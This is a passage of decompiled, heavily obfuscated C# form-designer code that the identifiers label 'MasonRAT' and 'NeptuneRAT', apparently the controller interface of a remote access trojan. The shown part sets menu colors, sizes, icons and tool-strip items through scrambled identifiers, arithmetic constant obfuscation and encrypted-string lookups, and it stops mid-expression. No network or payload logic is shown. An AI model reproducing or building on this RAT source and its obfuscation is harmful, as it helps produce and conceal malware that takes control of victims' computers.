\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.ColorTable = (ProfessionalColorTable) null;
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.RoundedEdges = true;
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.SelectionArrowColor = Color.FromArgb(819182043 - (298060202 | 549840767) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) + (1294223655 + -1278350010 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0)) % (-1452832630 - (1104114250 | 1632646680) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, ((-1345059939 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) - ~((1345060029 ^ 12) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, (-981317692 ^ -1000594682) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - (369241609 % 144602119 - 48685525 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.SelectionBackColor = Color.FromArgb(((-2127551595 ^ (1849844663 | 1016614643)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) + ((1574067321 - 117593154 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) >> (1324665990 - 980478524 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, ((85 ^ 570963933 >> 717020348) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) + ((-322615413 ^ -261337584) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0) >> (-390928248 - ~759458291 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, ((969059947 > 686141055 ? 337509635 : 450012846) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) + ~(-1736531868 - -2074041247 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.SelectionForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.SeparatorColor = Color.FromArgb((1985103169 > 1732826243 ? 1037617035 : 1383489380) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) - (-1094749177 - -2132366139 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, 219340233 - ~1820855832 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 - (167860511 - -1872335495 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, (272397889 + (1278538288 >> 361370818) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) + -((98629846 | 1360255746) - 850020773 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0);
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.RenderStyle.TextRenderingHint = TextRenderingHint.SystemDefault;
    this.\u2694️MasonRAT\u270Cـ\u060Bﻻ\u060Eء\u060F̨گـ\u060Eــم\u060F\u060A.Size = new Size((334272147 >> 1238246013) - 1085332840 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - ~(533971453 + (1102723113 >> 1689284321) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, 88);
    this.\u2694️MasonRAT\u270Cۡم\u060A\u060Dۡڟﻋټڙڇــڙ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cۡم\u060A\u060Dۡڟﻋټڙڇــڙ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2260));
    this.\u2694️MasonRAT\u270Cۡم\u060A\u060Dۡڟﻋټڙڇــڙ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2261);
    this.\u2694️MasonRAT\u270Cۡم\u060A\u060Dۡڟﻋټڙڇــڙ.Size = new Size(((-813485348 ^ -1309007541) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) > -162483462 - (1554683147 | 1872680241) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1) ? (1858201585 | 889221085) - 2143416148 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0 : 1679799501 - 1679799276 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, 28);
    this.\u2694️MasonRAT\u270Cۡم\u060A\u060Dۡڟﻋټڙڇــڙ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2262);
    this.\u2694️MasonRAT\u270C\u0608ټۙٻ\u060Cـڙـڙ\u060Dـ\u060E.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u0608ټۙٻ\u060Cـڙـڙ\u060Dـ\u060E.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2263));
    this.\u2694️MasonRAT\u270C\u0608ټۙٻ\u060Cـڙـڙ\u060Dـ\u060E.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2264);
    this.\u2694️MasonRAT\u270C\u0608ټۙٻ\u060Cـڙـڙ\u060Dـ\u060E.Size = new Size((619380915 % 875926156 - 374588308 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ (-843782428 - 1845609891 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1)) % (455257804 - (53239415 >> 1066491749) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 28);
    this.\u2694️MasonRAT\u270C\u0608ټۙٻ\u060Cـڙـڙ\u060Dـ\u060E.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2265);
    this.\u2694️MasonRAT\u270Cْ̍ڟ\u0609\u060B\u060C\u060Eـ\u0609طٺئ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cْ̍ڟ\u0609\u060B\u060C\u060Eـ\u0609طٺئ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2266));
    this.\u2694️MasonRAT\u270Cْ̍ڟ\u0609\u060B\u060C\u060Eـ\u0609طٺئ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2267);
    this.\u2694️MasonRAT\u270Cْ̍ڟ\u0609\u060B\u060C\u060Eـ\u0609طٺئ.Size = new Size(-270706241 - 108239126 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + ((1316241738 > 1948741780 ? -1614776202 : 2010143321) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 << (152891780 + (166226575 >> 2004240198) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 28);
    this.\u2694️MasonRAT\u270Cْ̍ڟ\u0609\u060B\u060C\u060Eـ\u0609طٺئ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2268);
    ToolStripItemCollection items2 = this.\u2694️MasonRAT\u270Cـ\u060Dڜۙـﮪڕ\u060F\u060B\u060D\u060A.Items;
    ToolStripItem[] toolStripItems2 = new ToolStripItem[((30180679 ^ 1139924042 % 73982891) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) + (1316498591 - 926646614 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> ((1476406433 ^ (1471535737 | 752342364)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0];
    toolStripItems2[0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cبٺ\u060D\u060Fۏ\u060D̍ــمﻻڙـ;
    toolStripItems2[1] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u060Bڛــﮪبڟدټ\u060E\u060D\u060D;
    toolStripItems2[(-1435688384 - -1435688401 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1) ^ (-1455077488 ^ ~1455077500) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cٺۭ\u060Dـﻋـ\u0020ــٺ\u060F\u060Aد\u0609ا\u060Fحـــ;
    items2.AddRange(toolStripItems2);
    this.\u2694️MasonRAT\u270Cـ\u060Dڜۙـﮪڕ\u060F\u060B\u060D\u060A.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2269);
    this.\u2694️MasonRAT\u270Cـ\u060Dڜۙـﮪڕ\u060F\u060B\u060D\u060A.Size = new Size((400813050 - 259624650 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) + -((1767514143 | 3760507) - 1628505295 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 70);
    this.\u2694️MasonRAT\u270Cبٺ\u060D\u060Fۏ\u060D̍ــمﻻڙـ.Image = (Image) NeptuneRAT.My.Resources.Resources.\u2694️MasonRAT\u270Cـ\u060Dـ\u060D\u060Eټـ\u0608ڟڣ;
    this.\u2694️MasonRAT\u270Cبٺ\u060D\u060Fۏ\u060D̍ــمﻻڙـ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2270);
    this.\u2694️MasonRAT\u270Cبٺ\u060D\u060Fۏ\u060D̍ــمﻻڙـ.Size = new Size((-62165927 ^ 1923556501 % 158078660) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + ((2136920182 > 677881739 ? 848136647 : 1130848862) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) % ((318056679 > 429823365 ? 270773633 : 203080225) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 22);
    this.\u2694️MasonRAT\u270Cبٺ\u060D\u060Fۏ\u060D̍ــمﻻڙـ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2271);
    this.\u2694️MasonRAT\u270C\u060Bڛــﮪبڟدټ\u060E\u060D\u060D.Image = (Image) NeptuneRAT.My.Resources.Resources.\u2694️MasonRAT\u270Cــة\u060C\u060Eــڠــ\u060Fۚـ̍ڛ;
    this.\u2694️MasonRAT\u270C\u060Bڛــﮪبڟدټ\u060E\u060D\u060D.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2272);
    this.\u2694️MasonRAT\u270C\u060Bڛــﮪبڟدټ\u060E\u060D\u060D.Size = new Size((505582782 + (1343759922 >> 2063098061) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) ^ (-1807664864 ^ ~797084917) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1) << -2128079035 - 503184990 % 2112245422 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, 22);
    this.\u2694️MasonRAT\u270C\u060Bڛــﮪبڟدټ\u060E\u060D\u060D.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2273);
    this.\u2694️MasonRAT\u270Cٺۭ\u060Dـﻋـ\u0020ــٺ\u060F\u060Aد\u0609ا\u060Fحـــ.Image = (Image) NeptuneRAT.My.Resources.Resources.\u2694️MasonRAT\u270C\u0609ــ̨ٻּۡــڙ;
    this.\u2694️MasonRAT\u270Cٺۭ\u060Dـﻋـ\u0020ــٺ\u060F\u060Aد\u0609ا\u060Fحـــ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2274);
    this.\u2694️MasonRAT\u270Cٺۭ\u060Dـﻋـ\u0020ــٺ\u060F\u060Aد\u0609ا\u060Fحـــ.Size = new Size((-1373628435 - ~1825564817 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ (631357871 + (128211576 >> 1071527487) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) << (-1607037732 ^ ~1451799703) + 